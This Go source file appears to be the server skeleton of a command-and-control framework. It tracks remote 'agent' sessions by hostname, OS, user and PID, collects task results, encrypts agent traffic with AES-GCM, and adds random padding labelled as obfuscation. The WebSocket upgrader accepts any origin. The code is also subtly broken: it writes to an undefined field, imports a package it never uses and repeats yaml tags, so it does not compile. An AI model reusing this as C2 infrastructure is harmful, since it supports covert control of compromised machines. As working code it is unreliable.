package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"sync"
	"time"

	"golang.org/x/crypto/hkdf"
	"github.com/gorilla/websocket"
)

type Config struct {
	BindAddress string `yaml:"bind_address"`
	BindPort    string `yaml:"bind_port"`
	UseSSL      bool   `yaml:"use_ssl"`
	CertFile    string `yaml:"cert_file"`
	KeyFile     string `yaml:"key_file"`

	WSEnabled       bool   `yaml:"enabled"`
	WSPath          string `yaml:"path"`
	WSSubprotocol   string `yaml:"subprotocol"`
	WSPingInterval  int    `yaml:"ping_interval"`
	WSPingTimeout   int    `yaml:"ping_timeout"`
	WSMaxMessageSize int64 `yaml:"max_message_size"`

	EncryptionAlgorithm string `yaml:"algorithm"`
	KeyDerivation       string `yaml:"key_derivation"`
	KeyRotation         int    `yaml:"key_rotation"`

	ObfuscationEnabled bool `yaml:"enabled"`
	FrameType          string `yaml:"frame_type"`
	PaddingEnabled     bool `yaml:"padding"`
	PaddingMinSize     int  `yaml:"min_size"`
	PaddingMaxSize     int  `yaml:"max_size"`
}

type WSServer struct {
	config     *Config
	upgrader   websocket.Upgrader
	connections sync.Map
	OnConnect   func(*WSConnection)
	OnDisconnect func(*WSConnection)
	OnMessage   func(*WSConnection, []byte)
}

type WSConnection struct {
	ID        string
	Conn      *websocket.Conn
	mu        sync.Mutex
	closed    bool
}

type AgentSession struct {
	ID           string
	AgentID      string
	Hostname     string
	OS           string
	Arch         string
	User         string
	PID          int
	LastCheckin  int64
	conn         *WSConnection
	sessionKey   []byte
	PublicKey    string
	mu           sync.RWMutex
	closed       bool
}

type AgentMessage struct {
	Type      string          `json:"type"`
	AgentID   string          `json:"agent_id,omitempty"`
	Hostname  string          `json:"hostname,omitempty"`
	OS        string          `json:"os,omitempty"`
	Arch      string          `json:"arch,omitempty"`
	User      string          `json:"user,omitempty"`
	PID       int             `json:"pid,omitempty"`
	Timestamp int64           `json:"timestamp,omitempty"`
	TaskID    string          `json:"task_id,omitempty"`
	Result    json.RawMessage `json:"result,omitempty"`
}

func LoadConfig(path string) (*Config, error) {
	// TODO: Load from YAML file
	return &Config{
		BindAddress: "0.0.0.0",
		BindPort:    "8443",
		UseSSL:      true,
		WSPath:      "/ws",
		WSPingInterval: 30,
		EncryptionAlgorithm: "aes-256-gcm",
		KeyDerivation: "hkdf-sha256",
		ObfuscationEnabled: true,
		FrameType: "binary",
		PaddingEnabled: true,
		PaddingMinSize: 0,
		PaddingMaxSize: 64,
	}, nil
}

func NewWSServer(config *Config) *WSServer {
	return &WSServer{
		config: config,
		upgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
	}
}

func (s *WSServer) Start() {
	// Start HTTP server with WebSocket handler
	// Implementation depends on the server framework
}

func NewAgentSession(conn *WSConnection, config *Config) *AgentSession {
	id := generateSessionID()
	return &AgentSession{
		ID:   id,
		conn: conn,
	}
}

func (s *AgentSession) GenerateSessionKey() {
	key := make([]byte, 32)
	rand.Read(key)
	s.sessionKey = key
	s.publicKey = base64.StdEncoding.EncodeToString(key)
}

func (s *AgentSession) Encrypt(data []byte) ([]byte, error) {
	if s.sessionKey == nil {
		return nil, errors.New("no session key")
	}

	// AES-256-GCM encryption
	return AESGCMEncrypt(data, s.sessionKey)
}

func (s *AgentSession) Decrypt(data []byte) ([]byte, error) {
	if s.sessionKey == nil {
		return nil, errors.New("no session key")
	}

	// AES-256-GCM decryption
	return AESGCMDecrypt(data, s.sessionKey)
}

func (s *AgentSession) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if !s.closed {
		s.conn.Close()
		s.closed = true
	}
}

func (c *WSConnection) Send(data []byte) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	if c.closed {
		return errors.New("connection closed")
	}

	return c.Conn.WriteMessage(websocket.BinaryMessage, data)
}

func (c *WSConnection) Close() {
	c.mu.Lock()
	defer c.mu.Unlock()
	if !c.closed {
		c.Conn.Close()
		c.closed = true
	}
}

func generateSessionID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// AES-256-GCM encryption
func AESGCMEncrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
	return append(nonce, ciphertext...), nil
}

// AES-256-GCM decryption
func AESGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// HKDF key derivation
func DeriveKey(secret, salt []byte, info string, length int) ([]byte, error) {
	hash := sha256.New

	// Extract
	prk := hkdf.Extract(hash, secret, salt)

	// Expand
	reader := hkdf.Expand(hash, prk, []byte(info))
	key := make([]byte, length)
	_, err := reader.Read(key)
	return key, err
}

// Add random padding for obfuscation
func AddPadding(data []byte, minSize, maxSize int) []byte {
	if maxSize <= 0 {
		return data
	}

	paddingSize := minSize
	if maxSize > minSize {
		var b [4]byte
		rand.Read(b[:])
		paddingSize += int(binary.BigEndian.Uint32(b[:]) % uint32(maxSize-minSize))
	}

	padding := make([]byte, paddingSize)
	rand.Read(padding)

	// Prepend length, then padding, then data
	result := make([]byte, 2+paddingSize+len(data))
	binary.BigEndian.PutUint16(result[:2], uint16(paddingSize))
	copy(result[2:2+paddingSize], padding)
	copy(result[2+paddingSize:], data)

	return result
}

// Remove padding
func RemovePadding(data []byte) ([]byte, error) {
	if len(data) < 2 {
		return nil, errors.New("data too short")
	}

	paddingSize := int(binary.BigEndian.Uint16(data[:2]))
	if len(data) < 2+paddingSize {
		return nil, errors.New("invalid padding size")
	}

	return data[2+paddingSize:], nil
}
